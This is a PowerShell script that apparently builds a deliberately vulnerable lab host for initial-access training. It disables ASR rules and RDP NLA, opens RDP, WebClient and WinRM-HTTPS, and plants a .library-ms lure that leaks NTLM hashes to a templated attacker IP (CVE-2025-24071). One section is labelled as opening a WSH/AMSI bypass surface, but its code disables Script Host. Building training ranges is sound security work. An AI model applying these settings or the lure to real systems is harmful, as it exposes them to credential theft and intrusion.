#Requires -Version 5
# ==============================================================================
# vuln_ia_surface - tatooine initial-access surface (BATCHED, tatooine only).
# Replaces ~13 WinRM round-trips with 1. IA-019..022 ASR off, IA-024 .library-ms
# NTLM-leak (CVE-2025-24071), IA-027/043 RDP NLA off, IA-033 WSH/AMSI off,
# IA-045 WebClient, IA-047 WSD/SSDP, IA-040 WinRM-HTTPS. Deliberately vulnerable.
# ==============================================================================
$ErrorActionPreference = 'Continue'
$log = 'C:\DunderLab\vuln_ia_ws01.log'
New-Item -ItemType Directory -Force -Path (Split-Path $log) | Out-Null
function Log($m) { Add-Content -Path $log -Value "$(Get-Date -Format o) $m"; Write-Output $m }

# -- IA-019..022: disable ASR rules (general defense weakening) ----------------
try {
  $k = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR'
  if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
  Set-ItemProperty -Path $k -Name ExploitGuard_ASR_Rules -Value 0 -Type DWord
  Log "CHANGED: IA-019..022 ASR rules disabled"
} catch { Log "ERROR: IA-019 $($_.Exception.Message)" }

# -- IA-024: crafted .library-ms NTLM hash leak (CVE-2025-24071) --------------
try {
  $lib = 'C:\Users\Public\Documents\EMPIREResources.library-ms'
  if (Test-Path $lib) {
    Log "OK: IA-024 .library-ms already present"
  } else {
    $xml = @'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE libraryDescription SYSTEM "library-ms-dtd">
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7D49D726-3C21-4F05-99AA-FDC2C9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription publisher="Microsoft" product="Windows">
      <description>@windows.storage.dll,-34577</description>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <simpleLocation>
        <url>\\{{ ia_attacker_ip }}\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
'@
    Set-Content -Path $lib -Value $xml -Encoding UTF8
    Log "CHANGED: IA-024 .library-ms NTLM-leak file created"
  }
} catch { Log "ERROR: IA-024 $($_.Exception.Message)" }

# -- IA-027 / IA-043: RDP NLA disabled + RDP enabled --------------------------
try {
  Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 0 -Type DWord
  Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 -Type DWord
  Log "CHANGED: IA-027/043 RDP NLA disabled + RDP enabled"
} catch { Log "ERROR: IA-027 $($_.Exception.Message)" }

# -- IA-027: RDP firewall rule (TCP 3389) -------------------------------------
try {
  if (-not (Get-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow | Out-Null
    Log "CHANGED: IA-027 RDP firewall rule added"
  } else {
    Enable-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" -ErrorAction SilentlyContinue
    Log "OK: IA-027 RDP firewall rule present"
  }
} catch { Log "ERROR: IA-027 $($_.Exception.Message)" }

# -- IA-033: Windows Script Host / AMSI bypass surface ------------------------
try {
  $k = 'HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings'
  $v = (Get-ItemProperty -Path $k -Name Enabled -ErrorAction SilentlyContinue).Enabled
  if ($v -eq 0) { Log "OK: IA-033 WSH already disabled" }
  else {
    if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
    Set-ItemProperty -Path $k -Name Enabled -Value 0 -Type DWord
    Log "CHANGED: IA-033 Windows Script Host disabled"
  }
} catch { Log "ERROR: IA-033 $($_.Exception.Message)" }

# -- IA-045: WebClient service Automatic + running ----------------------------
try {
  $svc = Get-Service -Name WebClient -ErrorAction SilentlyContinue
  if ($null -eq $svc) { Log "OK: IA-045 WebClient not present (skipped)" }
  else {
    Set-Service WebClient -StartupType Automatic -ErrorAction Stop
    if ((Get-Service WebClient).Status -ne 'Running') { Start-Service WebClient -ErrorAction Stop; Log "CHANGED: IA-045 WebClient started" }
    else { Log "OK: IA-045 WebClient already running" }
  }
} catch { Log "ERROR: IA-045 $($_.Exception.Message)" }

# -- IA-047: WSD / SSDP discovery services ------------------------------------
try {
  $changed = $false
  foreach ($name in @('FDResPub', 'SSDPSRV', 'fdPHost')) {
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($null -eq $svc) { continue }
    if ($svc.StartType -ne 'Automatic') { Set-Service $name -StartupType Automatic -ErrorAction SilentlyContinue; $changed = $true }
    $svc.Refresh()
    if ($svc.Status -ne 'Running') { Start-Service $name -ErrorAction SilentlyContinue; $changed = $true }
  }
  if ($changed) { Log "CHANGED: IA-047 WSD/SSDP services configured" } else { Log "OK: IA-047 WSD/SSDP already running" }
} catch { Log "ERROR: IA-047 $($_.Exception.Message)" }

# -- IA-040: WinRM-HTTPS 5986 self-signed listener ----------------------------
try {
  $exists = winrm enumerate winrm/config/Listener 2>&1 | Select-String "Transport = HTTPS"
  if ($exists) { Log "OK: IA-040 WinRM HTTPS already present" }
  else {
    $cert = New-SelfSignedCertificate -DnsName $env:COMPUTERNAME -CertStoreLocation "Cert:\LocalMachine\My" -NotAfter (Get-Date).AddYears(10) -ErrorAction Stop
    winrm create winrm/config/Listener?Address=*+Transport=HTTPS "@{Hostname=`"*`";CertificateThumbprint=`"$($cert.Thumbprint)`"}" | Out-Null
    if (-not (Get-NetFirewallRule -DisplayName "WinRM HTTPS 5986" -ErrorAction SilentlyContinue)) {
      New-NetFirewallRule -DisplayName "WinRM HTTPS 5986" -Direction Inbound -Protocol TCP -LocalPort 5986 -Action Allow | Out-Null
    }
    Log "CHANGED: IA-040 WinRM HTTPS listener created on tatooine"
  }
} catch { Log "ERROR: IA-040 $($_.Exception.Message)" }

Write-Output "DONE"
